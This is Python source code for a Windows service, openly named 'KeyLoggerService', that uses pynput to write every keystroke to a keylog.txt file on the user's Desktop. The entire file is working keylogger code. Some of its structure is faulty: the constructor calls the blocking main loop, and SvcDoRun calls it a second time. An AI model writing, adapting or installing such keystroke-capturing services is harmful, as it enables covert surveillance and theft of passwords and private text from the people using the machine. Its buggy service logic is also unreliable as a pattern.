import win32serviceutil
import win32service
import win32event
import servicemanager
import time
from pynput import keyboard
import os

class KeyLoggerService(win32serviceutil.ServiceFramework):
    _svc_name_ = "KeyLoggerService"
    _svc_display_name_ = "Key Logger Service"
    _svc_description_ = "A Windows service that logs keystrokes."

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.is_running = True

        # Define paths for log and error files
        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        self.log_file_path = os.path.join(desktop_path, "keylog.txt")
        self.error_file_path = os.path.join(desktop_path, "error_log.txt")

        # Test file paths and permissions
        self.test_file_paths()

        # Initialize listener
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        servicemanager.LogInfoMsg("KeyLoggerService started successfully.")
        self.main()

    def test_file_paths(self):
        """Test file paths and permissions."""
        try:
            # Test log file creation
            with open(self.log_file_path, "w") as file:
                file.write("Test log message.")
            servicemanager.LogInfoMsg(f"Log file created at: {self.log_file_path}")
        except Exception as e:
            self.log_error(f"Error creating log file: {e}")

        try:
            # Test error file creation
            with open(self.error_file_path, "w") as file:
                file.write("Test error message.")
            servicemanager.LogInfoMsg(f"Error file created at: {self.error_file_path}")
        except Exception as e:
            self.log_error(f"Error creating error file: {e}")

    def SvcStop(self):
        """Stop the service."""
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.is_running = False
        self.listener.stop()
        win32event.SetEvent(self.hWaitStop)
        servicemanager.LogInfoMsg("KeyLoggerService stopping...")

    def SvcDoRun(self):
        """Run the service."""
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFO_TYPE,
                              (servicemanager.PYS_SERVICE_NAME, servicemanager.SERVICE_STARTING))
        self.main()

    def main(self):
        """Main service loop."""
        while self.is_running:
            # Wait for stop event
            result = win32event.WaitForSingleObject(self.hWaitStop, 5000)
            if result == win32event.WAIT_OBJECT_0:
                # The event was signaled
                break
            # Perform periodic tasks if needed
            time.sleep(1)  # Sleep to avoid busy waiting

    def on_press(self, key):
        """Handle key press events."""
        try:
            with open(self.log_file_path, "a") as log_file:
                if hasattr(key, 'char') and key.char is not None:
                    log_file.write(f"{key.char}\n")
                else:
                    log_file.write(f"{key}\n")
        except Exception as e:
            self.log_error(f"Error writing to log file: {e}")

    def log_error(self, message):
        """Log error messages to the error file."""
        try:
            with open(self.error_file_path, "a") as error_file:
                error_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
        except Exception as e:
            servicemanager.LogErrorMsg(f"Failed to write to error log: {e}")

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(KeyLoggerService)
